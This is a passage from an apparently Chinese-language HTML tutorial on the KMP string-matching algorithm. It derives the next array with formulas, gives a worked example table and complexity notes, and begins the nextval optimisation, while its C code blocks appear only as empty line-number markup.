  1, &amp; \text{其他情况}
\end{cases}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:4.32em;vertical-align:-1.91em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.35em;"><span style="top:-2.2em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:-2.192em;"><span class="pstrut" style="height:3.15em;"></span><span style="height:0.316em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="0.316em" style="width:0.8889em" viewBox="0 0 888.89 316" preserveAspectRatio="xMinYMin"><path d="M384 0 H504 V316 H384z M384 0 H504 V316 H384z"></path></svg></span></span><span style="top:-3.15em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.292em;"><span class="pstrut" style="height:3.15em;"></span><span style="height:0.316em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="0.316em" style="width:0.8889em" viewBox="0 0 888.89 316" preserveAspectRatio="xMinYMin"><path d="M384 0 H504 V316 H384z M384 0 H504 V316 H384z"></path></svg></span></span><span style="top:-4.6em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.85em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.41em;"><span style="top:-4.41em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">0</span><span class="mpunct">,</span></span></span><span style="top:-2.97em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">∣1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mord"><span class="mord text"><span class="mord cjk_fallback">且</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8251em;"><span style="top:-3.1362em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">L</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4169em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">=</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mbin mtight">−</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord mathnormal">L</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3948em;"><span></span></span></span></span></span></span></span><span class="mpunct">,</span></span></span><span style="top:-1.53em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">1</span><span class="mpunct">,</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.91em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.41em;"><span style="top:-4.41em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">1</span></span></span><span style="top:-2.97em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord text"><span class="mord cjk_fallback">当此集合不空时</span></span></span></span><span style="top:-1.53em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord text"><span class="mord cjk_fallback">其他情况</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.91em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p>
<p>首先由公式可知：<code>next[1] = 0</code></p>
<p>设 <code>next[j] = k</code>，此时 <code>k</code> 应满足的条件在上文中已描述。此时 <code>next[j + 1] = ?</code> 可能有两种情况：</p>
<ol>
<li>若 <code>Pk = Pj</code>，则表明在模式串中 'P<sub>1</sub> … P<sub>k-1</sub>P<sub>k</sub>' = 'P<sub>j-k+1</sub> … P<sub>j-1</sub>P<sub>j</sub>'，并且不可能存在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>k</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>&gt;</mo><mi>k</mi></mrow><annotation encoding="application/x-tex">k' &gt; k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.791em;vertical-align:-0.0391em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 满足上述条件，此时 <code>next[j + l] = k + l</code>，即 <code>next[j + 1] = next[j] + 1</code></li>
<li>若 P<sub>k</sub> ≠ P<sub>j</sub>，则表明在模式串中 'P<sub>1</sub> … P<sub>k-1</sub>P<sub>k</sub>' ≠ 'P<sub>j-k+i</sub> … P<sub>j-1</sub>P<sub>j</sub>'</li>
</ol>
<p>此时可以把求 next 函数值的问题视为一个模式匹配的问题。用前缀 P<sub>1</sub> … P<sub>k</sub> 去跟后缀 P<sub>j-k+1</sub> … P<sub>j</sub> 匹配，则当 P<sub>k</sub> ≠ P<sub>j</sub> 时应将 P<sub>1</sub> … P<sub>k</sub> 向右滑动至以第 <code>next[k]</code> 个字符与 P<sub>j</sub> 比较，如果 P<sub>next[k]</sub> 与 P<sub>j</sub> 还是不匹配，那么需要寻找长度更短的相等前后缀，下一步继续用 P<sub>next[next[k]]</sub>与 P<sub>j</sub> 比较，以此类推，直到找到某个更小的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>k</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mi>n</mi><mi>e</mi><mi>x</mi><mi>t</mi><mo stretchy="false">[</mo><mi>n</mi><mi>e</mi><mi>x</mi><mi>t</mi><mo>…</mo><mo stretchy="false">[</mo><mi>k</mi><mo stretchy="false">]</mo><mo stretchy="false">]</mo><mo stretchy="false">(</mo><mi>l</mi><mo>&lt;</mo><msup><mi>k</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>&lt;</mo><mi>k</mi><mo>&lt;</mo><mi>j</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">k' = next[next … [k]] (l &lt; k' &lt; k &lt; j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord mathnormal">n</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">]]</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.791em;vertical-align:-0.0391em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span></span></span></span>，满足条件 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><msub><mi>P</mi><mn>1</mn></msub><mo>…</mo><msubsup><mi>P</mi><msup><mi>k</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><msup><mo>=</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><msub><mi>P</mi><mrow><mi>j</mi><mo>−</mo><msup><mi>k</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>+</mo><mn>1</mn></mrow></msub><mo>…</mo><msubsup><mi>P</mi><mi>j</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup></mrow><annotation encoding="application/x-tex">'P_{1} \dotsc P_{k'}' = 'P_{j-k'+1} \dotsc P_{j}'</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.035em;vertical-align:-0.2831em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4169em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2831em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">=</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1467em;vertical-align:-0.3948em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mbin mtight">−</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4413em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3948em;"><span></span></span></span></span></span></span></span></span></span> 则 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>e</mi><mi>x</mi><mi>t</mi><mo stretchy="false">[</mo><mi>j</mi><mo>+</mo><mn>1</mn><mo stretchy="false">]</mo><mo>=</mo><msup><mi>k</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">next[j + 1] = k' + 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8352em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>。</p>
<p>也可能不存在任何 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>k</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">k'</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span> 满足上述条件，即不存在长度更短的相等前缀后缀，令 <code>next[j + 1] = 1</code>。</p>
<p>例如：下表的模式串中已求得 <code>6</code> 个字符的 next 值，现求 <code>next[7]</code>，因为 <code>next[6] = 3</code>，又 P<sub>6</sub> ≠ P<sub>3</sub>，则需比较 P<sub>6</sub> 和 P<sub>1</sub>（因 <code>next[3] = 1</code>），由于 P<sub>6</sub> ≠ P<sub>1</sub>，而 <code>next[1] = 0</code>，所以 <code>next[7] = 1</code>；求 <code>next [8]</code>，因 P<sub>7</sub> = P<sub>1</sub>，则 <code>next[8] = next[7] + 1 = 2</code>；求 <code>next[9]</code>，因 P<sub>8</sub> = P<sub>2</sub>，则 <code>next[9] = 3</code>。</p>
<table>
<thead>
<tr>
<th style="text-align:center">j</th>
<th style="text-align:center">1</th>
<th style="text-align:center">2</th>
<th style="text-align:center">3</th>
<th style="text-align:center">4</th>
<th style="text-align:center">5</th>
<th style="text-align:center">6</th>
<th style="text-align:center">7</th>
<th style="text-align:center">8</th>
<th style="text-align:center">9</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">模式</td>
<td style="text-align:center">a</td>
<td style="text-align:center">b</td>
<td style="text-align:center">a</td>
<td style="text-align:center">a</td>
<td style="text-align:center">b</td>
<td style="text-align:center">c</td>
<td style="text-align:center">a</td>
<td style="text-align:center">b</td>
<td style="text-align:center">a</td>
</tr>
<tr>
<td style="text-align:center">next[j]</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">2</td>
<td style="text-align:center">2</td>
<td style="text-align:center">3</td>
<td style="text-align:center">?</td>
<td style="text-align:center">?</td>
<td style="text-align:center">?</td>
</tr>
</tbody>
</table>
<p>通过上述分析写出求 next 值的程序如下：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>计算机执行起来效率很高，但对于手工计算来说会很难。因此，当需要手工计算时，还是用最初的方法。</p>
<p>与 next 数组的求解相比，KMP 的匹配算法相对要简单很多，它在形式上与简单的模式匹配算法很相似。不同之处仅在于当匹配过程产生失配时，指针 <code>i</code> 不变，指针 <code>j</code> 退回到 <code>next[j]</code> 的位置并重新进行比较，并且当指针 <code>j</code> 为 <code>0</code> 时，指针 <code>i</code> 和 <code>j</code> 同时加 <code>1</code>。即若主串的第 <code>i</code> 个位置和模式串的第一个字符不等，则应从主串的第 <code>i + 1</code> 个位置开始匹配。具体代码如下：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>尽管普通模式匹配的时间复杂度是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>m</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(mn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">mn</span><span class="mclose">)</span></span></span></span>，KMP 算法的时间复杂度是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>m</mi><mo>+</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(m+n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，但在一般情况下，普通模式匹配的实际执行时间近似为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>m</mi><mo>+</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(m+n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，因此至今仍被采用。KMP 算法仅在主串与子串有很多 “部分匹配” 时才显得比普通算法快得多，其主要优点是主串不回溯。</p>
</li>
</ol>
<h4> KMP 算法的进一步优化</h4>
<p>前面定义的 next 数组在某些情况下尚有缺陷，还可以进一步优化。如下图所示，模式 <code>aaaab</code> 在和主串 <code>aaabaaaab</code> 进行匹配时：</p>
<table>
<thead>
<tr>
<th style="text-align:center">主串</th>
<th style="text-align:center">a</th>
<th style="text-align:center">a</th>
<th style="text-align:center">a</th>
<th style="text-align:center">b</th>
<th style="text-align:center">a</th>
<th style="text-align:center">a</th>
<th style="text-align:center">a</th>
<th style="text-align:center">a</th>
<th style="text-align:center">b</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">模式</td>
<td style="text-align:center">a</td>
<td style="text-align:center">a</td>
<td style="text-align:center">a</td>
<td style="text-align:center">a</td>
<td style="text-align:center">b</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">j</td>
<td style="text-align:center">1</td>
<td style="text-align:center">2</td>
<td style="text-align:center">3</td>
<td style="text-align:center">4</td>
<td style="text-align:center">5</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">next[j]</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
<td style="text-align:center">2</td>
<td style="text-align:center">3</td>
<td style="text-align:center">4</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">nextval[j]</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">4</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<p>当 i = 4、j = 4 时，s<sub>4</sub> 跟 p<sub>4</sub>（b ≠ a）失配，如果用之前的 next 数组还需要进行 s<sub>4</sub> 与 p<sub>3</sub>、s<sub>4</sub> 与 p<sub>2</sub>、s<sub>4</sub> 与 p<sub>1</sub> 这 <code>3</code> 次比较。事实上，因为 p<sub>next[4]</sub> = 3 = p<sub>4</sub> = a、p<sub>next[3]</sub> = 2 = p<sub>3</sub> = a、p<sub>next[2]</sub> = 1 = p<sub>2</sub> = a，显然后面 <code>3</code> 次用一个和 p<sub>4</sub> 相同的字符跟 s<sub>4</sub> 比较毫无意义，必然失配。那么问题出在哪里呢？</p>
<p>问题在于不应该出现 p<sub>j</sub> = p<sub>next[j]</sub>。理由是：当 P<sub>j</sub> ≠ s<sub>j</sub>时，下次匹配必然是 p<sub>next[j]</sub> 跟 s<sub>j</sub> 比较，如果 p<sub>j</sub> = p<sub>next[j]</sub>，那么相当于拿一个和 p<sub>j</sub> 相等的字符跟 s<sub>j</sub> 比较，这必然导致继续失配，这样的比较毫无意义。那么如果出现了 p<sub>j</sub> = p<sub>next[j]</sub> 应该如何处理呢？</p>
